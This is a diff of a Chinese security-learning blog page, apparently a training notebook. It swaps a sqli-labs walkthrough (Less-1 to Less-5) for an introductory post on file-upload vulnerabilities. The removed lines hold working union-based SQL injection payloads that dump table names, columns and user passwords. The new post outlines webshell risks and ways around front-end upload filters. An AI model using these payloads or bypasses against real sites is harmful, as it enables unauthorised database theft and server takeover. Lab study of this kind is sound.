@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="web漏洞">
-    <meta name="description" content="SQL注入练习">
+    <meta name="description" content="文件上传基础">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sqli-labs(1) | E=MC^2</title>
+    <title>文件上传（1） | E=MC^2</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -298,12 +298,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sqli-labs(1)</h1>
+                    <h1 class="description center-align post-title">文件上传（1）</h1>
                 </div>
             </div>
         </div>
@@ -419,8 +419,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">SQL注入</span>
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                <span class="chip bg-color">文件上传</span>
                             </a>
                         
                     </div>
@@ -431,8 +431,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/sqli-labs/" class="post-category">
-                                sqli-labs
+                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E6%B8%97%E9%80%8F/" class="post-category">
+                                小迪渗透
                             </a>
                         
                     </div>
@@ -444,28 +444,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-14
+                    2022-03-23
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-22
+                    2022-03-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    537
+                    324
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 
@@ -485,66 +485,25 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="1、Less-1"><a href="#1、Less-1" class="headerlink" title="1、Less-1"></a>1、Less-1</h3><p>From:<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45728976/article/details/103932264">https://blog.csdn.net/weixin_45728976/article/details/103932264</a></p>
-<p>基于GET的单引号的字符型</p>
-<p>（1）注入字符的判断</p>
-<p><code>?id=1</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142157884.png" alt="单引号"></p>
-<p>于是尝试用<code>&#39;</code>进行注入</p>
-<p><code>?id=1&#39; and 1=1 --+</code>将单引号闭合实现and 1=1逻辑判断，<code>--+</code>注释后面的单引号</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142200347.png" alt="正常返回"></p>
-<p>（2）确定注入字符后，对字段进行判断<code>order by</code></p>
-<p><code>?id=1&#39; order by 4--+</code>发现字段为4时开始报错，可得一共有三个字段</p>
-<p>（3）判断数据的注入点</p>
-<p><code>?id=-1&#39; union select 1,2,3--+</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142205896.png" alt="2和3注入点"></p>
-<p>（4）数据库名信息收集</p>
-<p><code>?id=-1&#39; union select 1,database(),user()--+</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142207815.png" alt="数据库名和用户"></p>
-<p>（5）查找security数据库下表的信息</p>
-<p><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142211815.png" alt="此数据库下的表"></p>
-<p>（6）查找users表下列的信息</p>
-<p><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142214352.png" alt="表下的列信息"></p>
-<p>（7）查询password列下的信息</p>
-<p><code>?id=-1&#39; union select 1,2,group_concat(password) from users --+</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142227554.png" alt="列下的信息"></p>
-<h3 id="2、Less2"><a href="#2、Less2" class="headerlink" title="2、Less2"></a>2、Less2</h3><p>基于GET的整型</p>
-<p>（1）注入字符判断</p>
-<p><code>?id=1 and 1=1</code>在返回的语句中可以发现是整型</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150819837.png" alt="整型"></p>
-<p>（2）字段判断<code>order by</code></p>
-<p><code>?id=1 order by 4</code>可知一共有三个字段</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150822126.png" alt="字段判断"></p>
-<p>（3）注入点判断</p>
-<p><code>?id=-1 union select 1,2,3</code>这里注入点的判断需要报错，可知2,3为注入点</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150823795.png" alt="2和3"></p>
-<p>（4）数据库信息查询</p>
-<p><code>?id=-1 union select 1,database(),user()</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150825771.png" alt="数据库名，用户"></p>
-<p>（5）在security数据库下的表信息查询</p>
-<p><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150828657.png" alt="该数据库下的表"></p>
-<p>（6）查询users表下的列信息</p>
-<p><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150829894.png" alt="users表下的列信息"></p>
-<p>（7）查询users表下password列下的password、username</p>
-<p><code>?id=-1 union select 1,group_concat(username),group_concat(password) from users</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150832991.png" alt="列下信息"></p>
-<h3 id="3、Less3"><a href="#3、Less3" class="headerlink" title="3、Less3"></a>3、Less3</h3><p>基于GET的<code>&#39;)</code>的字符型</p>
-<p><code>?id=1 and 1=1</code>可以发现是单引号和括号的组合字符</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150836927.png" alt="单引号变形"></p>
-<p>于是用<code>?id=1&#39;) and 1=1%23</code>进行绕过，这里是GET型参数因此无法用<code>#</code>号，因此可以用<code>#</code>的URL编码<code>%23</code>进行注释</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150841620.png" alt="%23"></p>
-<p>接下来再用基本方法查询即可</p>
-<h3 id="4、Less4"><a href="#4、Less4" class="headerlink" title="4、Less4"></a>4、Less4</h3><p>基于GET的双引号和括号字符型</p>
-<p><code>?id=1 and 1=1</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150852038.png" alt="双引号括号"></p>
-<p><code>?id=1&#39;&#39;) and 1=1--+</code></p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202203150853230.png" alt="绕过" style="zoom:67%;" />
+                <h3 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h3><img src="https://gitee.com/mie1732/emc/raw/master/img/202203231609231.png" alt="分类" style="zoom:67%;" />
 
-<h3 id="5、Less5"><a href="#5、Less5" class="headerlink" title="5、Less5"></a>5、Less5</h3><p>基于GET的单引号错误回显注入</p>
+<p>（1）什么是文件上传漏洞？</p>
+<p>存在文件上传的地方就可能存在</p>
+<p>（2）危害</p>
+<p>可以成为网站后门webshell获取权限</p>
+<p>（3）漏洞的查找和判断</p>
+<p>黑盒查找：扫描敏感文件获取上传地址；功能点测试；后台处的文件上传（后台权限不等于网站权限）</p>
+<p> 白盒查找：拿到网页源码后，通过代码分析是否有文件上传漏洞</p>
+<p>判断：抓包或测试</p>
+<p>注：文件上传类型的分析</p>
+<h3 id="2、常规文件上传地址获取"><a href="#2、常规文件上传地址获取" class="headerlink" title="2、常规文件上传地址获取"></a>2、常规文件上传地址获取</h3><p>扫描网站敏感文件</p>
+<p>工具：wwwscan、御剑、AWVS</p>
+<p>搜索网站关键词<code>site: URL upload</code></p>
+<h3 id="3、文件上传基础"><a href="#3、文件上传基础" class="headerlink" title="3、文件上传基础"></a>3、文件上传基础</h3><p>（1）上传文件的格式不能混用，如果要求上传php文件，则一般不上传图片，除非有解析漏洞（搭建平台）</p>
+<p>（2）文件上传的绕过：</p>
+<p>抓包修改文件后缀（如果采用的全为js代码，在本地执行，没有用php接收可能抓不到包）；</p>
+<p>修改前端代码（对文件格式的过滤代码，因为将前端代码本地保存，所以最后需要添加action访问到图片对应上传的地址）</p>
+<p>知道网站的CMS可以直接搜索XXXCMS上传漏洞</p>
 
                 
             </div>
@@ -571,7 +530,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/14/sqli-labs-1/">http://example.com/2022/03/14/sqli-labs-1/</a>
+                    <a href="http://example.com/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%881%EF%BC%89/">http://example.com/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%881%EF%BC%89/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -609,8 +568,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">SQL注入</span>
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                    <span class="chip bg-color">文件上传</span>
                                 </a>
                             
                         </div>
@@ -656,29 +615,30 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/17/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%884%EF%BC%89/">
+                <a href="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%881%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="web-SQL注入（4）">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="文件上传（1）">
                         
-                        <span class="card-title">web-SQL注入（4）</span>
+                        <span class="card-title">文件上传（1）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SQL注入，Oracle,MongoDB等注入
+                            文件上传基础
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -691,11 +651,12 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">SQL注入</span>
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                        <span class="chip bg-color">文件上传</span>
                     </a>
                     
                 </div>
@@ -709,24 +670,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/14/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%883%EF%BC%89/">
+                <a href="/2022/03/23/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%886%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="web-SQL注入（3）">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="web-SQL注入（6）">
                         
-                        <span class="card-title">web-SQL注入（3）</span>
+                        <span class="card-title">web-SQL注入（6）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SQL注入，注入类型以及提交注入
+                            SQL注入，sqlmap
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-23
                             </span>
                         <span class="publish-author">
                             
